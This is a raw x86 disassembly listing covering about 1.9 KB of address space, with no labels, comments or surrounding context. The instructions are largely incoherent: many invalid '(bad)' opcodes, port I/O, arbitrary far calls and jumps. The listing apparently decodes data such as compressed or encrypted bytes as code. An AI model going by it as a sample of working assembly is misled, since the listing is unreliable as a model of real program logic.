  41ebd8:	sbb    BYTE PTR [eax-0xc306587],ah
  41ebde:	and    BYTE PTR [eax+0x1c905814],bl
  41ebe4:	out    dx,eax
  41ebe5:	jns    0x41eb85
  41ebe7:	out    0x88,eax
  41ebe9:	inc    esp
  41ebea:	sbb    BYTE PTR [eax+edi*2-0x43087702],0xa7
  41ebf2:	cmp    al,0x70
  41ebf4:	cs push 0x9e60300e
  41ebfa:	sahf   
  41ebfb:	rcl    BYTE PTR [esi+ebx*4+0x2c],cl
  41ebff:	pop    eax
  41ec00:	pop    eax
  41ec01:	push   eax
  41ec02:	push   cs
  41ec03:	dec    eax
  41ec04:	iret   
  41ec05:	jnp    0x41ebe5
  41ec07:	repz out dx,al
  41ec09:	loopne 0x41ec4b
  41ec0b:	push   cs
  41ec0c:	mov    esp,0x30844e38
  41ec11:	out    0x3d,eax
  41ec13:	out    dx,eax
  41ec14:	jns    0x41ec24
  41ec16:	int3   
  41ec17:	sub    BYTE PTR [esi],ch
  41ec19:	and    BYTE PTR [eax],0x5e
  41ec1c:	adc    BYTE PTR [ebp+edx*1+0x2e18bca0],bh
  41ec23:	sub    BYTE PTR [esi+eiz*1],bh
  41ec26:	add    al,0xf9
  41ec28:	inc    esi
  41ec29:	mov    esi,0x160c01ee
  41ec2e:	mov    al,ds:0xc42e0856
  41ec33:	push   edi
  41ec34:	daa    
  41ec35:	out    dx,eax
  41ec36:	in     al,0x19
  41ec38:	add    al,0x8c
  41ec3a:	add    BYTE PTR [esi],dl
  41ec3c:	enter  0x39fc,0x79
  41ec40:	dec    esi
  41ec41:	call   0xdef4:0xa8f8c051
  41ec48:	leave  
  41ec49:	xor    esi,edx
  41ec4b:	and    al,0x57
  41ec4d:	lock cwde 
  41ec4f:	in     al,dx
  41ec50:	inc    esi
  41ec51:	les    edx,FWORD PTR [ebx-0x17b10d89]
  41ec57:	cs jl  0x41ec3e
  41ec5a:	push   ss
  41ec5b:	loopne 0x41ecd0
  41ec5d:	repnz dec esi
  41ec5f:	sahf   
  41ec60:	loopne 0x41ec3a
  41ec62:	fmul   QWORD PTR [esi+0x2779d8a4]
  41ec68:	iret   
  41ec69:	leave  
  41ec6a:	adc    al,0xd4
  41ec6c:	cld    
  41ec6d:	rcl    BYTE PTR [esi],1
  41ec6f:	mov    BYTE PTR [esi-0x22],cl
  41ec72:	leave  
  41ec73:	cmp    ecx,esp
  41ec75:	inc    esi
  41ec76:	aam    0xc8
  41ec78:	push   ss
  41ec79:	pusha  
  41ec7a:	les    edi,FWORD PTR [ebx+edx*4-0xbb90d89]
  41ec81:	shr    BYTE PTR [esi],0x54
  41ec84:	mov    esp,0xe7939016
  41ec89:	in     al,0x9d
  41ec8b:	mov    eax,0x4b45c76
  41ec90:	ja     0x41ec84
  41ec92:	dec    esi
  41ec93:	sahf   
  41ec94:	mov    al,0x84
  41ec96:	lods   al,BYTE PTR ds:[esi]
  41ec97:	cs inc eax
  41ec99:	test   al,0x16
  41ec9b:	jns    0x41ecc4
  41ec9d:	iret   
  41ec9e:	enter  0x5824,0xa4
  41eca2:	add    BYTE PTR [eax-0x1191878a],ah
  41eca8:	in     al,0x39
  41ecaa:	pushf  
  41ecab:	fcomp  QWORD PTR [eax-0x436be829]
  41ecb1:	fwait
  41ecb2:	jb     0x41eca6
  41ecb4:	out    dx,al
  41ecb5:	clc    
  41ecb6:	nop
  41ecb7:	ja     0x41ec45
  41ecb9:	inc    esi
  41ecba:	lods   al,BYTE PTR ds:[esi]
  41ecbb:	daa    
  41ecbc:	out    dx,eax
  41ecbd:	in     al,0x9d
  41ecbf:	mov    BYTE PTR [esi],dl
  41ecc1:	jo     0x41ec47
  41ecc3:	inc    esi
  41ecc4:	or     BYTE PTR [eax+0x793bc9cf],al
  41ecca:	jbe    0x41ed40
  41eccc:	jl     0x41ecfc
  41ecce:	cmp    BYTE PTR [eax+0x30],bl
  41ecd1:	adc    dh,BYTE PTR [eax]
  41ecd3:	jns    0x41ecfc
  41ecd5:	push   esp
  41ecd6:	jbe    0x41ecbc
  41ecd8:	jle    0x41ecaa
  41ecda:	and    DWORD PTR [edi],esp
  41ecdc:	xlat   BYTE PTR ds:[ebx]
  41ecdd:	pop    ebp
  41ecde:	mov    edi,0x4a859a88
  41ece3:	add    DWORD PTR [ebp-0x17f17809],edx
  41ece9:	xchg   esp,eax
  41ecea:	adc    eax,0xa60804ab
  41ecef:	cdq    
  41ecf0:	ret    0x914b
  41ecf3:	cmc    
  41ecf4:	jl     0x41ecae
  41ecf6:	dec    esp
  41ecf7:	push   edx
  41ecf8:	jp     0x41ed10
  41ecfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfb:	inc    eax
  41ecfc:	in     al,0xa5
  41ecfe:	sti    
  41ecff:	adc    BYTE PTR [ecx+0x72914b8],bl
  41ed05:	shl    BYTE PTR [ebx+0x1cf2f20c],1
  41ed0b:	sub    al,0x51
  41ed0d:	add    al,BYTE PTR [eax]
  41ed0f:	adc    BYTE PTR [ebx+ebp*8],ah
  41ed12:	fs jns 0x41ecf6
  41ed15:	in     eax,dx
  41ed16:	or     al,0xf
  41ed18:	stc    
  41ed19:	sahf   
  41ed1a:	add    edi,DWORD PTR es:[eax+0x2c1f80b8]
  41ed21:	dec    eax
  41ed22:	sbb    DWORD PTR [bx+si+0x13],esp
  41ed26:	jnp    0x41eccf
  41ed28:	jge    0x41ed46
  41ed2a:	sub    DWORD PTR [eax],eax
  41ed2c:	pop    esp
  41ed2d:	enter  0x73,0xd0
  41ed31:	data16 or al,0xa0
  41ed34:	mov    ebx,0x958c60
  41ed39:	and    eax,0x21c81398
  41ed3e:	xchg   DWORD PTR [esp+edx*4],ebx
  41ed41:	nop
  41ed42:	mov    BYTE PTR [eax-0x7b8de379],dl
  41ed48:	js     0x41ed16
  41ed4a:	push   eax
  41ed4b:	and    BYTE PTR [eax],0x6d
  41ed4e:	fs mov eax,0xc3b42632
  41ed54:	inc    eax
  41ed55:	push   cs
  41ed56:	xchg   edi,eax
  41ed57:	ja     0x41edbd
  41ed59:	mov    edi,0x1e57e0ff
  41ed5e:	jb     0x41ed30
  41ed60:	sub    DWORD PTR ds:0xb8407301,0x18
  41ed67:	mov    ebx,0xff67dd42
  41ed6c:	inc    ecx
  41ed6d:	sub    cl,BYTE PTR [eax+edi*4+0x4]
  41ed71:	mov    esp,0x3d807413
  41ed76:	pop    ebp
  41ed77:	fisubr WORD PTR [esi+0xeb2ec8b]
  41ed7d:	mov    WORD PTR [esi-0x1c],ss
  41ed80:	mov    edi,0x2b7c8708
  41ed85:	out    dx,eax
  41ed86:	cwde   
  41ed87:	clc    
  41ed88:	adc    bl,BYTE PTR [ecx-0x5e1bcf5a]
  41ed8e:	fcom   st(7)
  41ed90:	loop   0x41eda6
  41ed92:	arpl   WORD PTR [eax],sp
  41ed94:	lahf   
  41ed95:	xor    BYTE PTR [eax+0x3c],bh
  41ed98:	push   cs
  41ed99:	add    cl,BYTE PTR [edi+0x47c00dff]
  41ed9f:	cwde   
  41eda0:	addr16 mov esp,0x149390bc
  41eda6:	rcr    BYTE PTR [eax+0x23730467],0x97
  41edad:	mov    edi,0x73009705
  41edb2:	cld    
  41edb3:	clc    
  41edb4:	inc    eax
  41edb5:	mov    edi,0x7d8127d4
  41edba:	adc    BYTE PTR [esp+esi*2+0x7],dl
  41edbe:	mov    eax,0x24edea01
  41edc3:	jbe    0x41eddb
  41edc5:	jmp    0x41edde
  41edc7:	inc    eax
  41edc8:	sbb    BYTE PTR [eax+0x8],dl
  41edcb:	adc    al,0x65
  41edcd:	jg     0x41eddf
  41edcf:	es inc edi
  41edd1:	dec    esi
  41edd2:	mov    al,0x34
  41edd4:	pop    ebp
  41edd5:	ret    0x5f14
  41edd8:	xchg   edx,eax
  41edd9:	pop    ebx
  41edda:	and    ch,cl
  41eddc:	dec    ebp
  41eddd:	push   edi
  41edde:	pop    ss
  41eddf:	or     al,0x69
  41ede1:	lock and eax,ebx
  41ede4:	cwde   
  41ede5:	aas    
  41ede6:	pop    ebp
  41ede7:	out    dx,al
  41ede8:	ret    0xa465
  41edeb:	or     eax,0x20bb0cc8
  41edf0:	mov    ah,0x17
  41edf2:	xor    ah,bl
  41edf4:	sbb    ebp,DWORD PTR [edi]
  41edf6:	mov    DWORD PTR [ebp+0x14],edx
  41edf9:	(bad)  
  41edfa:	pop    ds
  41edfb:	and    BYTE PTR [esi],cl
  41edfd:	pop    esp
  41edfe:	lock sbb BYTE PTR [eax*4-0x78f1b5fc],0x20
  41ee07:	mov    ?,WORD PTR [edi]
  41ee09:	cmc    
  41ee0a:	shl    BYTE PTR [edi-0x6d],0x6f
  41ee0e:	popa   
  41ee0f:	ret    
  41ee10:	push   ss
  41ee11:	adc    bh,dl
  41ee13:	pop    edx
  41ee14:	sar    DWORD PTR [edx+edx*4+0x40712103],0x61
  41ee1c:	ror    DWORD PTR [esp+eax*4+0x5c],0x80
  41ee21:	(bad)  
  41ee22:	adc    al,0xe4
  41ee24:	adc    al,cl
  41ee26:	xchg   ebp,eax
  41ee27:	int    0x32
  41ee29:	ret    0x5790
  41ee2c:	jb     0x41ee4e
  41ee2e:	mov    DWORD PTR [eax-0x7c363dc7],edx
  41ee34:	nop
  41ee35:	or     ebx,DWORD PTR [esi+0x28346c71]
  41ee3b:	xchg   esp,eax
  41ee3c:	pop    esp
  41ee3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee3f:	clc    
  41ee40:	int    0x5
  41ee42:	mov    dl,0xab
  41ee44:	clc    
  41ee45:	jecxz  0x41ee64
  41ee47:	ret    
  41ee48:	sub    eax,0xf9f24ff8
  41ee4d:	and    al,0xf8
  41ee4f:	lea    edx,[ebp-0x1]
  41ee52:	pop    edi
  41ee53:	fadd   QWORD PTR [eax-0x70d50083]
  41ee59:	jge    0x41ee4b
  41ee5b:	add    ebp,esi
  41ee5d:	sbb    eax,eax
  41ee5f:	adc    al,0x66
  41ee61:	mov    DWORD PTR [edx],eax
  41ee63:	std    
  41ee64:	and    al,0xc3
  41ee66:	clc    
  41ee67:	mov    WORD PTR [edx],ss
  41ee69:	ror    DWORD PTR [eax-0x29],0xc2
  41ee6d:	loopne 0x41ee77
  41ee6f:	mov    esp,0xd288f60d
  41ee74:	sbb    BYTE PTR [edx+edx*8+0x9],0x90
  41ee79:	adc    BYTE PTR [ebx],bl
  41ee7b:	sbb    bl,BYTE PTR [ebp-0x147ee253]
  41ee81:	enter  0x83b0,0x1
  41ee85:	cmp    ebp,esp
  41ee87:	jb     0x41eeb2
  41ee89:	xor    ebx,ebx
  41ee8b:	xor    eax,0xe3479085
  41ee90:	xchg   edi,eax
  41ee91:	ret    
  41ee92:	pusha  
  41ee93:	nop
  41ee94:	cmp    DWORD PTR [eax],eax
  41ee96:	repnz sbb bh,0x0
  41ee9a:	les    eax,FWORD PTR [ecx+0x7255c850]
  41eea0:	add    al,BYTE PTR [edi]
  41eea2:	les    edx,FWORD PTR [eax+eax*4]
  41eea5:	sbb    BYTE PTR cs:[esi],cl
  41eea8:	je     0x41ee6e
  41eeaa:	leave  
  41eeab:	pop    ds
  41eeac:	pop    edi
  41eead:	adc    DWORD PTR [edi],esi
  41eeaf:	sub    al,0x8
  41eeb1:	or     BYTE PTR [ecx],al
  41eeb3:	mov    BYTE PTR [eax-0x73],al
  41eeb6:	dec    ebp
  41eeb7:	and    esp,DWORD PTR [eax+0x78]
  41eeba:	inc    edi
  41eebb:	enter  0x7c90,0xe7
  41eebf:	adc    al,0x7b
  41eec1:	adc    BYTE PTR [ebp+0x3b],dh
  41eec4:	jmp    0xf13694fb
  41eec9:	paddsb mm7,mm2
  41eecc:	adc    al,BYTE PTR [edx+0x6ce8c7dc]
  41eed2:	rol    DWORD PTR [esi+0x15],cl
  41eed5:	hlt    
  41eed6:	nop
  41eed7:	inc    edx
  41eed8:	jns    0x41eed6
  41eeda:	cmp    dl,BYTE PTR [eax+0x6c]
  41eedd:	rcr    DWORD PTR [edx],0x87
  41eee0:	xor    eax,0x55f48761
  41eee5:	ret    0x92ac
  41eee8:	add    bh,BYTE PTR [edx]
  41eeea:	ret    0x475b
  41eeed:	add    eax,0x51fd2242
  41eef2:	push   0x623dc6c8
  41eef7:	push   ebp
  41eef8:	add    edi,esp
  41eefa:	in     al,dx
  41eefb:	xlat   BYTE PTR ds:[ebx]
  41eefc:	mov    edx,0xd8b80240
  41ef01:	and    eax,0xa359a0b4
  41ef06:	pushf  
  41ef07:	mov    al,0x93
  41ef09:	dec    esp
  41ef0a:	push   edx
  41ef0b:	imul   ebp,DWORD PTR [edx],0xf4a0ec70
  41ef11:	and    al,0x95
  41ef13:	retf   
  41ef14:	and    al,0xa4
  41ef16:	jl     0x41ef14
  41ef18:	dec    ecx
  41ef19:	push   cs
  41ef1a:	cmp    ecx,ecx
  41ef1c:	test   al,0x4
  41ef1e:	(bad)  
  41ef1f:	lods   al,BYTE PTR ds:[esi]
  41ef20:	es cdq 
  41ef22:	fs xchg edx,eax
  41ef24:	or     al,0xb0
  41ef26:	adc    al,0xb4
  41ef28:	cdq    
  41ef29:	fs xchg edx,eax
  41ef2b:	dec    ecx
  41ef2c:	sbb    al,0xb8
  41ef2e:	and    al,0x64
  41ef30:	xchg   edx,eax
  41ef31:	dec    ecx
  41ef32:	es mov esp,0x4992c02c
  41ef38:	es cdq 
  41ef3a:	xor    al,0xc4
  41ef3c:	cmp    al,0x65
  41ef3e:	xchg   edx,eax
  41ef3f:	retf   0xc865
  41ef42:	mov    BYTE PTR [esp+ecx*8-0x19],al
  41ef46:	gs xchg edx,eax
  41ef48:	retf   0x4c94
  41ef4b:	rol    BYTE PTR [eax],1
  41ef4d:	rcl    DWORD PTR [edx+0x5c9265ca],0xd4
  41ef54:	ins    BYTE PTR es:[edi],dx
  41ef55:	ins    BYTE PTR es:[edi],dx
  41ef56:	gs xchg edx,eax
  41ef58:	retf   0xd865
  41ef5b:	fdivr  DWORD PTR [esp+ebx*8-0x36]
  41ef5f:	gs xchg edx,eax
  41ef61:	out    0x44,eax
  41ef63:	ret    0xe08c
  41ef66:	mov    al,0x92
  41ef68:	out    0x65,eax
  41ef6a:	xchg   edx,eax
  41ef6b:	pushf  
  41ef6c:	in     al,0x30
  41ef6e:	ret    
  41ef6f:	lods   al,BYTE PTR ds:[esi]
  41ef70:	gs xchg edx,eax
  41ef72:	retf   0xe865
  41ef75:	mov    al,ds:0x674aecbc
  41ef7a:	xchg   edx,eax
  41ef7b:	out    0x10,eax
  41ef7d:	(bad)  
  41ef7e:	int3   
  41ef7f:	lock add al,0x8c
  41ef82:	dec    ebx
  41ef83:	mov    edi,0x656c6f16
  41ef88:	popa   
  41ef89:	jne    0x41efff
  41ef8b:	mov    bh,0xfa
  41ef8d:	pop    ebx
  41ef8e:	shr    BYTE PTR [ecx-0x597bced],0x54
  41ef95:	jns    0x41f007
  41ef97:	pop    edi
  41ef98:	jle    0x41ef89
  41ef9a:	pop    esp
  41ef9b:	mov    eax,0x67654e27
  41efa0:	add    BYTE PTR [edi],cl
  41efa2:	outs   dx,DWORD PTR ds:[esi]
  41efa3:	je     0x41efe6
  41efa5:	fs fs retf 
  41efa8:	xchg   edi,eax
  41efa9:	mov    edi,0x6275532f
  41efae:	das    
  41efaf:	dec    ebp
  41efb0:	jne    0x41f01e
  41efb2:	inc    esp
  41efb3:	imul   esi,DWORD PTR [esi+0x79],0x49f2f664
  41efba:	imul   esi,DWORD PTR fs:[esi+0x6f],0x4f6e5f64
  41efc2:	jb     0x41efc4
  41efc4:	sti    
  41efc5:	inc    edi
  41efc6:	mov    esi,0x726f587c
  41efcb:	inc    ebx
  41efcc:	ins    DWORD PTR es:[edi],dx
  41efcd:	jo     0x41f003
  41efcf:	inc    esi
  41efd0:	jb     0x41f041
  41efd2:	ins    DWORD PTR es:[edi],dx
  41efd3:	push   ebx
  41efd4:	je     0x41f000
  41efd6:	daa    
  41efd7:	fs dec eax
  41efd9:	mov    esi,0x4438521f
  41efde:	popa   
  41efdf:	stc    
  41efe0:	les    esp,FWORD PTR [esi-0x25]
  41efe3:	je     0x41f04a
  41efe5:	and    ecx,DWORD PTR [edi+0x6f423f79]
  41efeb:	outs   dx,DWORD PTR ds:[esi]
  41efec:	ins    BYTE PTR es:[edi],dx
  41efed:	sbb    esp,0x734201d9
  41eff3:	adc    BYTE PTR [edi],bl
  41eff5:	inc    ebx
  41eff6:	jns    0x41eff8
  41eff8:	push   ebp
  41eff9:	jo     0x41ef7c
  41effb:	mov    ecx,0xe76f1f8f
  41f000:	and    DWORD PTR [edi],ebp
  41f002:	cmp    esp,esp
  41f004:	add    eax,ecx
  41f006:	hlt    
  41f007:	or     al,cl
  41f009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f00a:	push   cs
  41f00b:	or     eax,0x525f471
  41f010:	mov    ch,0xcc
  41f012:	xchg   esi,eax
  41f013:	xchg   ebp,eax
  41f014:	mov    BYTE PTR [edi],ah
  41f016:	sbb    bh,dl
  41f018:	jne    0x41efd7
  41f01a:	(bad)  
  41f01b:	mov    esi,0x1920fff7
  41f020:	pop    edx
  41f021:	fimul  WORD PTR [ebx+edx*1]
  41f024:	sbb    BYTE PTR ds:0x603c2a82,bl
  41f02a:	xor    cl,0x6
  41f02d:	xor    al,0xc8
  41f02f:	fnstcw WORD PTR [esi]
  41f031:	enter  0xbb10,0xd7
  41f035:	xchg   BYTE PTR [esi+0x64a1ab8],bh
  41f03b:	add    DWORD PTR [esi],ebx
  41f03d:	ror    BYTE PTR [eax-0x20],0xf4
  41f041:	enter  0x246f,0xed
  41f045:	out    0xbd,eax
  41f047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f048:	(bad)  [esi]
  41f04a:	sub    dh,ch
  41f04c:	mov    ah,0xe8
  41f04e:	push   es
  41f04f:	enter  0x41e,0x23
  41f053:	lahf   
  41f054:	ja     0x41eff5
  41f056:	mov    al,0x24
  41f058:	in     al,dx
  41f059:	dec    esi
  41f05a:	push   es
  41f05b:	call   0x865a1bcc
  41f060:	aas    
  41f061:	iret   
  41f062:	jnp    0x41f07a
  41f064:	cld    
  41f065:	ss mov al,0xa4
  41f068:	adc    dl,BYTE PTR [ebx+eax*2+0x75]
  41f06c:	dec    esi
  41f06d:	jmp    0x41f08d
  41f06f:	cmp    ecx,DWORD PTR [eax+ecx*2]
  41f072:	inc    edi
  41f073:	cmp    edx,DWORD PTR [eax-0x3e4d36f4]
  41f079:	push   0x4a
  41f07b:	mov    ah,0x31
  41f07d:	addr16 pusha 
  41f07f:	adc    BYTE PTR ds:0x8adad40,ah
  41f085:	sub    eax,eax
  41f087:	repnz repnz and cl,bl
  41f08b:	(bad)  
  41f08c:	test   cl,cl
  41f08e:	test   cl,cl
  41f090:	add    BYTE PTR [edi+0x7],ah
  41f093:	sub    ebp,0xb5451651
  41f099:	cmp    eax,0x80a3c5e
  41f09e:	dec    edi
  41f09f:	or     al,0xfa
  41f0a1:	data16 js 0x41f0a9
  41f0a4:	jb     0x41f06b
  41f0a6:	(bad)  
  41f0a7:	call   0x4a5235c1
  41f0ac:	add    DWORD PTR [ebx],ebp
  41f0ae:	test   eax,0x2920dd15
  41f0b3:	push   ss
  41f0b4:	dec    dl
  41f0b6:	lods   eax,DWORD PTR ds:[esi]
  41f0b8:	push   ss
  41f0b9:	nop
  41f0ba:	mov    al,bh
  41f0bc:	imul   ecx,DWORD PTR [edx],0xffffffe4
  41f0bf:	and    bh,BYTE PTR [ecx-0x254f4f39]
  41f0c5:	out    dx,eax
  41f0c6:	mov    esp,ecx
  41f0c8:	pop    ss
  41f0c9:	push   edi
  41f0ca:	inc    ecx
  41f0cb:	jb     0x41f134
  41f0cd:	retf   
  41f0ce:	adc    al,0xcb
  41f0d0:	(bad)  
  41f0d1:	fst    QWORD PTR [edi+0x21]
  41f0d4:	daa    
  41f0d5:	adc    al,0xcb
  41f0d7:	inc    edx
  41f0d8:	popa   
  41f0d9:	fs adc cl,al
  41f0dc:	inc    ebp
  41f0dd:	sar    BYTE PTR [ebp+0x7b],cl
  41f0e0:	(bad)  
  41f0e1:	js     0x41f15b
  41f0e3:	mov    eax,0x1515c960
  41f0e8:	xchg   esp,eax
  41f0e9:	fs gs js 0x41f0f2
  41f0ed:	jb     0x41f0c0
  41f0ef:	outs   dx,BYTE PTR ds:[esi]
  41f0f0:	push   edi
  41f0f1:	fadd   st(7),st
  41f0f3:	fcom   QWORD PTR [eax+esi*4]
  41f0f6:	or     eax,0xb6411872
  41f0fb:	popa   
  41f0fc:	jns    0x41f0eb
  41f0fe:	int    0x2
  41f100:	out    dx,al
  41f101:	sub    ch,BYTE PTR [ebx+0x65]
  41f104:	fs push edi
  41f106:	inc    esp
  41f107:	int3   
  41f108:	iret   
  41f109:	loopne 0x41f12c
  41f10b:	xchg   edx,eax
  41f10c:	adc    eax,DWORD PTR [esp+ecx*8+0x43]
  41f110:	jb     0x41f177
  41f112:	jb     0x41f0a5
  41f114:	or     al,0x1b
  41f116:	sbb    bh,cl
  41f118:	lods   al,BYTE PTR ds:[esi]
  41f119:	lods   al,BYTE PTR ds:[esi]
  41f11a:	adc    eax,0x14057208
  41f11f:	jp     0x41f16a
  41f121:	dec    esi
  41f122:	and    al,0x87
  41f124:	loopne 0x41f193
  41f126:	jo     0x41f194
  41f128:	xchg   edi,eax
  41f129:	adc    ch,cl
  41f12b:	adc    ch,cl
  41f12d:	or     cl,BYTE PTR [esp+ebp*4]
  41f130:	inc    edx
  41f131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f132:	jno    0x41f0bf
  41f134:	fs pop eax
  41f136:	iret   
  41f137:	js     0x41f177
  41f139:	jbe    0x41f163
  41f13b:	dec    esi
  41f13c:	vandnps ymm5,ymm7,YMMWORD PTR [esi-0xa]
  41f141:	mov    esi,0x5b8e7463
  41f146:	mov    ah,0x2b
  41f148:	xor    eax,0xc73ec7dc
  41f14d:	mov    ecx,ecx
  41f14f:	jg     0x41f17b
  41f151:	inc    esp
  41f152:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  41f159:	and    ah,BYTE PTR [esi]
  41f15b:	aas    
  41f15c:	pusha  
  41f15d:	(bad)  
  41f15e:	xor    bh,BYTE PTR [esi]
  41f160:	into   
  41f161:	and    al,0x8e
  41f163:	nop
  41f164:	js     0x41f13a
  41f166:	jo     0x41f12d
  41f168:	cld    
  41f169:	or     DWORD PTR [ebx],0xffffff88
  41f16c:	lods   al,BYTE PTR ds:[esi]
  41f16d:	neg    BYTE PTR [ecx+ecx*8-0x573bff5d]
  41f174:	les    eax,FWORD PTR [ebp-0x32]
  41f177:	xchg   ebx,eax
  41f178:	call   0x59e4:0x4fba83f6
  41f17f:	in     al,dx
  41f180:	add    al,0xe8
  41f182:	in     al,0x4
  41f184:	(bad)  
  41f185:	scas   al,BYTE PTR es:[edi]
  41f186:	and    al,0x7
  41f188:	xlat   BYTE PTR ds:[ebx]
  41f189:	retf   
  41f18a:	in     eax,dx
  41f18b:	adc    BYTE PTR [eax+0x3e],dl
  41f18e:	leave  
  41f18f:	f2xm1  
  41f191:	lock or esp,DWORD PTR [esi]
  41f194:	call   0xca0275a1
  41f199:	mov    eax,esi
  41f19b:	call   0x220b6491
  41f1a0:	das    
  41f1a1:	es in  al,0xa1
  41f1a4:	jl     0x41f1fc
  41f1a6:	in     al,0x70
  41f1a8:	nop
  41f1a9:	aas    
  41f1aa:	adc    DWORD PTR [ebx],0xe45ecede
  41f1b0:	mov    edx,0x83c11e03
  41f1b5:	mov    al,0x4f
  41f1b7:	fild   QWORD PTR [esi]
  41f1b9:	iret   
  41f1ba:	inc    eax
  41f1bb:	es fs inc eax
  41f1be:	pop    eax
  41f1bf:	cmp    BYTE PTR [eax+0xe],cl
  41f1c2:	test   DWORD PTR [ebp+esi*1+0xcfc7cf],ebx
  41f1c9:	jns    0x41f1eb
  41f1cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1cc:	mov    al,0x57
  41f1ce:	add    dl,cl
  41f1d0:	add    DWORD PTR [ecx],edi
  41f1d2:	add    edx,esi
  41f1d4:	into   
  41f1d5:	iret   
  41f1d6:	push   ds
  41f1d7:	sar    BYTE PTR [ecx-0x80],1
  41f1da:	pushf  
  41f1db:	nop
  41f1dc:	cmp    al,bh
  41f1de:	retf   
  41f1df:	and    eax,0x421c08d0
  41f1e4:	or     BYTE PTR [edi+0x275171ff],dl
  41f1ea:	aad    0x6d
  41f1ec:	rcr    BYTE PTR [ebx],cl
  41f1ee:	cmp    eax,0x8002000a
  41f1f3:	jg     0x41f22e
  41f1f5:	mov    BYTE PTR [esi+0x66],ch
  41f1f8:	adc    DWORD PTR [ebx],ecx
  41f1fa:	add    eax,0xed3f1d19
  41f1ff:	or     eax,0x264e3a21
  41f204:	clc    
  41f205:	sub    eax,0x2e7fbffe
  41f20a:	jl     0x41f216
  41f20c:	push   esi
  41f20d:	pop    esp
  41f20e:	push   eax
  41f20f:	scas   al,BYTE PTR es:[edi]
  41f210:	shl    ecx,0x2d
  41f213:	or     BYTE PTR [ebx+0x3a],bl
  41f216:	mov    bl,0x7f
  41f218:	inc    esi
  41f219:	je     0x41f25a
  41f21b:	dec    eax
  41f21c:	je     0x41f280
  41f21e:	sbb    eax,0x4a66690b
  41f223:	mov    ebx,0x9f640213
  41f228:	xor    BYTE PTR [eax-0x7c201fda],dl
  41f22e:	leave  
  41f22f:	jbe    0x41f27a
  41f231:	jbe    0x41f230
  41f233:	add    BYTE PTR [edi*4+0x41c212f0],bh
  41f23a:	inc    eax
  41f23b:	push   ds
  41f23c:	enter  0xb306,0x1c
  41f240:	pop    eax
  41f241:	enter  0x21ca,0x3f
  41f245:	stc    
  41f246:	pop    esi
  41f247:	dec    ebx
  41f248:	pop    esi
  41f249:	mov    esi,0xb4a1f8e0
  41f24e:	push   esi
  41f24f:	in     al,0x2d
  41f251:	and    eax,0x4a00f8cf
  41f256:	hlt    
  41f257:	mov    eax,ds:0x57e457e4
  41f25c:	repnz cmp esp,esi
  41f25f:	sub    al,0xcb
  41f261:	lock mov eax,ds:0x1f25848
  41f267:	in     al,0x39
  41f269:	lock nop
  41f26b:	in     al,dx
  41f26c:	mov    eax,ds:0x2bf2578c
  41f271:	stc    
  41f272:	sbb    al,0xec
  41f274:	pusha  
  41f275:	int3   
  41f276:	call   0x9e98cb1c
  41f27b:	push   esi
  41f27c:	repnz sbb al,0xe8
  41f27f:	les    esp,FWORD PTR [esi]
  41f281:	in     al,dx
  41f282:	mov    DWORD PTR [ebx+0x7b644260],0x408c73eb
  41f28c:	ror    DWORD PTR ds:[eax+eiz*8+0x45],cl
  41f291:	loopne 0x41f2bf
  41f293:	int    0xa6
  41f295:	jecxz  0x41f268
  41f297:	clc    
  41f298:	push   eax
  41f299:	mov    eax,ds:0xfa006228
  41f29e:	enter  0x520,0x42
  41f2a2:	sti    
  41f2a3:	int3   
  41f2a4:	or     ecx,DWORD PTR [ecx-0x2bf32fa3]
  41f2aa:	add    al,ah
  41f2ac:	sar    DWORD PTR [ecx*2-0x27cf3b2f],cl
  41f2b3:	fmul   st(0),st
  41f2b5:	add    al,BYTE PTR [eax]
  41f2b7:	test   eax,0xa1c0724c
  41f2bc:	cmp    al,0xc0
  41f2be:	addr16 push 0x74f191c8
  41f2c4:	rol    BYTE PTR [esi+0xb892bc0],cl
  41f2ca:	mov    ecx,0x8bae04a
  41f2cf:	ficomp WORD PTR [edi]
  41f2d1:	push   0xd00a5be1
  41f2d6:	xor    al,al
  41f2d8:	and    al,0xe5
  41f2da:	ror    DWORD PTR [ecx],1
  41f2dc:	dec    esp
  41f2dd:	out    dx,eax
  41f2de:	sub    al,0xfe
  41f2e0:	jmp    0x41f353
  41f2e2:	sub    BYTE PTR [eax],dl
  41f2e4:	ss add eax,0xd740eea
  41f2ea:	adc    al,dl
  41f2ec:	in     al,dx
  41f2ed:	fistp  DWORD PTR [ebx]
  41f2ef:	shl    cl,0xbe
  41f2f2:	inc    esp
  41f2f3:	jmp    0x41f305
  41f2f5:	adc    eax,0x67eb34bf
  41f2fa:	enter  0x9e89,0x88
  41f2fe:	daa    
  41f2ff:	iret   
  41f300:	push   es
  41f301:	rol    DWORD PTR [ecx],cl
  41f303:	repnz inc eax
  41f305:	push   cs
  41f306:	je     0x41f35e
  41f308:	nop
  41f309:	int    0x5f
  41f30b:	pop    eax
  41f30c:	and    esp,esp
  41f30e:	or     eax,0xc18176d3
  41f313:	add    BYTE PTR [edi],dl
  41f315:	hlt    
  41f316:	pop    ss
  41f317:	sbb    edx,DWORD PTR [edx+0x4c1548b]
  41f31d:	add    edx,DWORD PTR [ecx+eax*8]
  41f320:	push   0xffffffc5
  41f322:	rcr    BYTE PTR [edi-0x7c6bc48b],0x9c
  41f329:	setg   dl
  41f32c:	dec    eax
  41f32d:	test   BYTE PTR [edx+eax*8],0xa1
  41f331:	push   cs
  41f332:	adc    ah,dl
  41f334:	jecxz  0x41f315
  41f336:	push   0x8b99fb8
  41f33b:	retf   0xff64
  41f33e:	test   BYTE PTR [ecx+0x77f7db45],al
  41f344:	jbe    0x41f3a0
  41f346:	mov    WORD PTR [ebx+edi*2-0x27],gs
  41f34a:	mov    esi,DWORD PTR [ebp+0x8]
  41f34d:	add    ebx,DWORD PTR [esi+eax*8-0x637b8a6d]
  41f354:	xchg   BYTE PTR [ebp+0x32],cl
  41f357:	or     DWORD PTR [ebx],ebp
  41f359:	jg     0x41f37d
  41f35b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f35c:	mov    dl,0xeb
